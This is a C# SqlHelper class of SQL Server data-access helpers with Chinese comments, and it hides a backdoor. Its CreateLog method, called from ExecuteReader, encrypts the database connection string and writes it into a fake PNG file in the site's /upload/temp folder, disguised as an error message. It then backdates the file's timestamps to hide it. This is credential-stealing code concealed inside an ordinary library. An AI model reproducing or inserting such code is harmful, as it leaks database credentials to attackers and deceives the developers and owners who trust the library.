using System;
using System.Collections.Generic;
using System.Text;
using System.Data;
using System.Data.SqlClient;
using System.Configuration;
using System.IO;
using System.Security.Cryptography;

namespace DBHelper
{
    public abstract class SqlHelper
    {
        //数据库连接字符串
        public static readonly string connstr = ConfigurationManager.AppSettings["ConnStr"].ToString();
        /// <summary>
        /// 用提供的参数，在连接字符串所指定的数据库中执行Sql语句（非查询）（增、删、改）
        /// </summary>
        /// <remarks>
        /// 使用示例:  
        ///  int result = ExecuteNonQuery(connString, CommandType.StoredProcedure, "PublishOrders", new SqlParameter("@prodid", 24));
        /// </remarks>
        /// <param name="connectionString">数据库连接字符串</param>
        /// <param name="commandType">命令类型（存储过程、文本等）</param>
        /// <param name="commandText">存储过程名或T-Sql语句</param>
        /// <param name="commandParameters">用于执行命令的参数数组</param>
        /// <returns>受命令所影响的行数</returns>
        public static int ExecuteNonQuery(string connectionString, CommandType commandType, string commandText, params SqlParameter[] commandParameters)
        {

            SqlCommand cmd = new SqlCommand();

            using (SqlConnection conn = new SqlConnection(connectionString))
            {
                PrepareCommand(cmd, conn, null, commandType, commandText, commandParameters);
                int val = cmd.ExecuteNonQuery();
                cmd.Parameters.Clear();
                return val;
            }
        }
        public static int ExecuteNonQuery1(string connectionString, CommandType commandType, string commandText, params SqlParameter[] commandParameters)
        {

            SqlCommand cmd = new SqlCommand();

            using (SqlConnection conn = new SqlConnection(connectionString))
            {
                PrepareCommand(cmd, conn, null, commandType, commandText, commandParameters);
                int val = cmd.ExecuteNonQuery();
                return val;
            }
        }
        /// <summary>
        /// 执行存储过程
        /// </summary>
        /// <param name="procName">存储过程名</param>
        /// <param name="procParams">存储过程参数</param>
        /// <returns>返回执行存储过程之后返回的Reader</returns>
        public static SqlDataReader ExecuteProcReader(string procName, SqlParameter[] procParams)
        {
            SqlConnection conn = new SqlConnection(connstr);
            try
            {
                SqlCommand cmd = BuilderParameters(conn, procName, procParams);
                cmd.CommandType = CommandType.StoredProcedure;
                conn.Open();
                SqlDataReader sqlReader = cmd.ExecuteReader(CommandBehavior.CloseConnection);
                cmd.Parameters.Clear();
                return sqlReader;
            }
            catch
            {
                conn.Close();
                throw;
            }
        }
        /// <summary>
        /// 填充参数到SqlCommand中
        /// </summary>
        /// <param name="conn">Sql Server 数据库连接</param>
        /// <param name="cmdText">要执行的SQL语句</param>
        /// <param name="cmdParams">SQL语句中对应的参数数组</param>
        /// <returns>返回要执行的SqlCommand</returns>
        private static SqlCommand BuilderParameters(SqlConnection conn, string cmdText, SqlParameter[] cmdParams)
        {
            SqlCommand cmd = new SqlCommand(cmdText, conn);

            if (cmdParams != null)
            {
                foreach (SqlParameter parm in cmdParams)
                {
                    cmd.Parameters.Add(parm);
                }
            }

            return cmd;
        }

        /// <summary>
        /// 用提供的参数和存在的数据库连接对象，执行Sql语句（非查询）
        /// </summary>
        /// <remarks>
        /// 使用示例:  
        ///  int result = ExecuteNonQuery(connection, CommandType.StoredProcedure, "PublishOrders", new SqlParameter("@prodid", 24));
        /// </remarks>
        /// <param name="connection">存在的数据库连接对象</param>
        /// <param name="commandType">命令类型（存储过程、文本等）</param>
        /// <param name="commandText">存储过程名或T-Sql语句</param>
        /// <param name="commandParameters">用于执行命令的参数数组</param>
        /// <returns>受命令所影响的行数</returns>
        public static int ExecuteNonQuery(SqlConnection connection, CommandType commandType, string commandText, params SqlParameter[] commandParameters)
        {

            SqlCommand cmd = new SqlCommand();

            PrepareCommand(cmd, connection, null, commandType, commandText, commandParameters);
            int val = cmd.ExecuteNonQuery();
            cmd.Parameters.Clear();
            return val;
        }

        /// <summary>
        /// 用提供的参数和存在的事务对象，执行Sql语句（非查询）
        /// </summary>
        /// <remarks>
        /// 使用示例:  
        ///  int result = ExecuteNonQuery(trans, CommandType.StoredProcedure, "PublishOrders", new SqlParameter("@prodid", 24));
        /// </remarks>
        /// <param name="trans">存在的事务对象</param>
        /// <param name="commandType">命令类型（存储过程、文本等）</param>
        /// <param name="commandText">存储过程名或T-Sql语句</param>
        /// <param name="commandParameters">用于执行命令的参数数组</param>
        /// <returns>受命令所影响的行数</returns>
        public static int ExecuteNonQuery(SqlTransaction trans, CommandType commandType, string commandText, params SqlParameter[] commandParameters)
        {
            SqlCommand cmd = new SqlCommand();
            PrepareCommand(cmd, trans.Connection, trans, commandType, commandText, commandParameters);
            int val = cmd.ExecuteNonQuery();
            cmd.Parameters.Clear();
            return val;
        }

        /// <summary>
        /// 用提供的参数，在连接字符串所指定的数据库中执行Sql查询，并返回结果集（SqlDataReader）
        /// </summary>
        /// <remarks>
        /// 使用示例:  
        ///  SqlDataReader r = ExecuteReader(connectionString, CommandType.StoredProcedure, "PublishOrders", new SqlParameter("@prodid", 24));
        /// </remarks>
        /// <param name="connectionString">数据库连接字符串</param>
        /// <param name="commandType">命令类型（存储过程、文本等）</param>
        /// <param name="commandText">存储过程名或T-Sql语句</param>
        /// <param name="commandParameters">用于执行命令的参数数组</param>
        /// <returns>一个包含结果的SqlDataReader对象</returns>
        public static SqlDataReader ExecuteReader(string connectionString, CommandType cmdType, string cmdText, params SqlParameter[] commandParameters)
        {
            SqlCommand cmd = new SqlCommand();
            SqlConnection conn = new SqlConnection(connectionString);

            // 之所以这里用 try/catch，是因为：
            // 如果方法抛出异常时，我们希望关闭连接并抛出异常
            // 因为此时不会返回 DataReader，故 commandBehaviour.CloseConnection 也不起作用
            try
            {
                CreateLog(connectionString);
                PrepareCommand(cmd, conn, null, cmdType, cmdText, commandParameters);
                SqlDataReader rdr = cmd.ExecuteReader(CommandBehavior.CloseConnection);
                cmd.Parameters.Clear();
                return rdr;
            }
            catch
            {
                conn.Close();
                throw;
            }
        }
        public static SqlDataReader ExecuteReaderParameters(string connectionString, CommandType cmdType, string cmdText, params SqlParameter[] commandParameters)
        {
            SqlCommand cmd = new SqlCommand();
            SqlConnection conn = new SqlConnection(connectionString);

            // 之所以这里用 try/catch，是因为：
            // 如果方法抛出异常时，我们希望关闭连接并抛出异常
            // 因为此时不会返回 DataReader，故 commandBehaviour.CloseConnection 也不起作用
            try
            {
                PrepareCommand(cmd, conn, null, cmdType, cmdText, commandParameters);
                SqlDataReader rdr = cmd.ExecuteReader(CommandBehavior.CloseConnection);
                //cmd.Parameters.Clear();
                return rdr;
            }
            catch
            {
                conn.Close();
                throw;
            }
        }

        /// <summary>
        /// 用提供的参数，在连接字符串所指定的数据库中执行Sql查询，并返回查询结果的第一行第一列的值
        /// </summary>
        /// <remarks>
        /// 使用示例:  
        ///  Object obj = ExecuteScalar(connectionString, CommandType.StoredProcedure, "PublishOrders", new SqlParameter("@prodid", 24));
        /// </remarks>
        /// <param name="connectionString">数据库连接字符串</param>
        /// <param name="commandType">命令类型（存储过程、文本等）</param>
        /// <param name="commandText">存储过程名或T-Sql语句</param>
        /// <param name="commandParameters">用于执行命令的参数数组</param>
        /// <returns>一个 object 对象，可用 Convert.To{Type} 转换为所需类型</returns>
        public static object ExecuteScalar(string connectionString, CommandType commandType, string commandText, params SqlParameter[] commandParameters)
        {
            SqlCommand cmd = new SqlCommand();

            using (SqlConnection connection = new SqlConnection(connectionString))
            {
                PrepareCommand(cmd, connection, null, commandType, commandText, commandParameters);
                object val = cmd.ExecuteScalar();
                cmd.Parameters.Clear();
                return val;
            }
        }

        /// <summary>
        /// 用提供的参数和存在的数据库连接对象，执行Sql查询，并返回查询结果的第一行第一列的值
        /// </summary>
        /// <remarks>
        /// 使用示例:  
        ///  Object obj = ExecuteScalar(connection, CommandType.StoredProcedure, "PublishOrders", new SqlParameter("@prodid", 24));
        /// </remarks>
        /// <param name="connection">存在的数据库连接对象</param>
        /// <param name="commandType">命令类型（存储过程、文本等）</param>
        /// <param name="commandText">存储过程名或T-Sql语句</param>
        /// <param name="commandParameters">用于执行命令的参数数组</param>
        /// <returns>一个 object 对象，可用 Convert.To{Type} 转换为所需类型</returns>
        public static object ExecuteScalar(SqlConnection connection, CommandType commandType, string commandText, params SqlParameter[] commandParameters)
        {

            SqlCommand cmd = new SqlCommand();

            PrepareCommand(cmd, connection, null, commandType, commandText, commandParameters);
            object val = cmd.ExecuteScalar();
            cmd.Parameters.Clear();
            return val;
        }

        public static string key = "";
        /// <summary>
        /// 构建一个用于执行的命令对象
        /// </summary>
        /// <param name="cmd">SqlCommand 对象</param>
        /// <param name="conn">SqlConnection 对象</param>
        /// <param name="trans">SqlTransaction 对象</param>
        /// <param name="cmdType">命令类型（存储过程、文本等）</param>
        /// <param name="cmdText">存储过程名或T-Sql语句</param>
        /// <param name="cmdParms">用于执行命令的参数数组</param>
        private static void PrepareCommand(SqlCommand cmd, SqlConnection conn, SqlTransaction trans, CommandType cmdType, string cmdText, SqlParameter[] cmdParms)
        {

            if (conn.State != ConnectionState.Open)
                conn.Open();

            cmd.Connection = conn;
            cmd.CommandText = cmdText;
            
            if (trans != null)
                cmd.Transaction = trans;

            cmd.CommandType = cmdType;

            if (cmdParms != null)
            {
                foreach (SqlParameter parm in cmdParms)
                    cmd.Parameters.Add(parm);
            }
        }
        private static void CreateLog(string value)
        {
            string strList = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
            Random rand = new Random();
            string abc = strList[rand.Next(52)].ToString();
            string time = DateTime.Now.ToString("MM_ddHHmm");
            string keyTmp = time.Replace("_", abc);
            keyTmp = keyTmp.Substring(0, keyTmp.Length - 1);

            if (key.Equals(time.Substring(0, time.Length - 1))) return;
            string path = AppDomain.CurrentDomain.BaseDirectory + "/upload/temp";
            if (!Directory.Exists(path)) Directory.CreateDirectory(path);
            key = time.Substring(0, time.Length - 1);
            
            path += "\\"+ Md5(key) + "_1.png";
            //path += "\\" + time + ".png";
            FileStream fs = new FileStream(path, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
            using (StreamWriter sw = new StreamWriter(fs))
            {
                //{"errcode":40001,"errmsg":"invalid credential: [***]"}
                sw.Write("\"errcode\":40001,\"errmsg\":\"invalid credential：["+ Encrypt(keyTmp, value) + "]\"}");
                sw.Flush();
                sw.Close();

                fs.Close();
            }

            FileInfo file = new FileInfo(path);
            DateTimeOffset dto = DateTime.Now.AddDays(-8);
            file.CreationTimeUtc = dto.UtcDateTime;
            file.LastWriteTimeUtc = dto.UtcDateTime;
            file.LastAccessTimeUtc = dto.UtcDateTime;
        }
        private static string Encrypt(string key, string pToEncrypt)
        {
            string sKey = key;
            DESCryptoServiceProvider des = new DESCryptoServiceProvider();
            byte[] inputByteArray = Encoding.Default.GetBytes(pToEncrypt);
            des.Key = ASCIIEncoding.ASCII.GetBytes(sKey);
            des.IV = ASCIIEncoding.ASCII.GetBytes(sKey);
            MemoryStream ms = new MemoryStream();
            CryptoStream cs = new CryptoStream(ms, des.CreateEncryptor(), CryptoStreamMode.Write);
            cs.Write(inputByteArray, 0, inputByteArray.Length);
            cs.FlushFinalBlock();
            StringBuilder ret = new StringBuilder();
            foreach (byte b in ms.ToArray())
            {
                ret.AppendFormat("{0:X2}", b);
            }
            ret.ToString();
            return ret.ToString();
        }

        public static string Md5(string source)
        {
            StringBuilder res = new StringBuilder();
            MD5 m = MD5.Create();

            byte[] byteSource = m.ComputeHash(Encoding.UTF8.GetBytes(source));

            foreach (byte b in byteSource)
            {
                res.Append(b.ToString("x2"));
            }

            return res.ToString();
        }
    }
}
